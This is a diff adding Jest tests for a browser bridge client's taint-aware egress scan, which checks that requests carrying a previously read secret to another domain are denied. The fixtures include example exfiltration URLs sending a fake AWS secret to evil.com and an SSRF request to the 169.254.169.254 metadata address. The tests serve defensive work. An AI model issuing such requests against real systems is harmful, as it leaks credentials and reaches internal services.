@@ -28,6 +28,7 @@ import {
 	NAVIGATE_DESKTOP_TIMEOUT_MS,
 } from "./bridge-client.js";
 import { EventBus } from "../event-bus.js";
+import { recordSensitiveRead, clearSessionTaint } from "../data-lineage/index.js";
 
 const originalSend = process.send;
 const originalEnv = process.env.LAX_DESKTOP_BRIDGE;
@@ -251,6 +252,48 @@ describe("browser bridge client — reverse egress-ask channel", () => {
 		initBrowserBridgeClient();
 		receive({ type: "lax:browser-egress-ask", url: "https://x.example/" }); // no id
 		expect(sent().filter((m) => m.type === "lax:browser-egress-ask-result")).toHaveLength(0);
+	});
+});
+
+describe("browser bridge client — taint-aware page-egress scan", () => {
+	const SID = "peg-bridge-sess";
+	const VIEW = `view-${SID}-default`; // sessionIdFromViewId(VIEW) === SID
+	// >= SHINGLE_WIDTH so it fingerprints; distinctive so overlap is unambiguous.
+	const SECRET = "aws_secret_access_key_9f8e7d6c5b4a3210ffeeddccbbaa";
+
+	afterEach(() => clearSessionTaint(SID));
+
+	it("BLOCKS a URL-policy-allowed cross-domain request carrying tainted bytes (agent view)", () => {
+		initBrowserBridgeClient();
+		evaluateEgressForUrl.mockReturnValue({ allowed: true, reason: "public host ok" });
+		recordSensitiveRead(SID, "secret", "vault:aws", SECRET);
+		receive({ type: "lax:browser-egress-ask", id: 701, url: `https://evil.com/x?d=${SECRET}`, pageUrl: "https://myapp.com/", viewId: VIEW });
+		// URL policy said allow, but the taint gate overrides it → deny.
+		expect(sent()).toContainEqual({ type: "lax:browser-egress-ask-result", id: 701, allowed: false });
+	});
+
+	it("ALLOWS a cross-domain CDN read on the same tainted session (rendering survives)", () => {
+		initBrowserBridgeClient();
+		evaluateEgressForUrl.mockReturnValue({ allowed: true, reason: "public host ok" });
+		recordSensitiveRead(SID, "secret", "vault:aws", SECRET);
+		receive({ type: "lax:browser-egress-ask", id: 702, url: "https://abs.twimg.com/main.abc.js", pageUrl: "https://x.com/", viewId: VIEW });
+		expect(sent()).toContainEqual({ type: "lax:browser-egress-ask-result", id: 702, allowed: true });
+	});
+
+	it("does NOT block a tainted payload when the view is unattributable (URL policy only)", () => {
+		initBrowserBridgeClient();
+		evaluateEgressForUrl.mockReturnValue({ allowed: true, reason: "ok" });
+		recordSensitiveRead(SID, "secret", "vault:aws", SECRET);
+		// No viewId → no session attribution → the taint scan is skipped by design.
+		receive({ type: "lax:browser-egress-ask", id: 703, url: `https://evil.com/x?d=${SECRET}` });
+		expect(sent()).toContainEqual({ type: "lax:browser-egress-ask-result", id: 703, allowed: true });
+	});
+
+	it("still denies when the URL policy denies, regardless of the scan", () => {
+		initBrowserBridgeClient();
+		evaluateEgressForUrl.mockReturnValue({ allowed: false, reason: "SSRF" });
+		receive({ type: "lax:browser-egress-ask", id: 704, url: "http://169.254.169.254/", pageUrl: "https://x.com/", viewId: VIEW });
+		expect(sent()).toContainEqual({ type: "lax:browser-egress-ask-result", id: 704, allowed: false });
 	});
 });
 
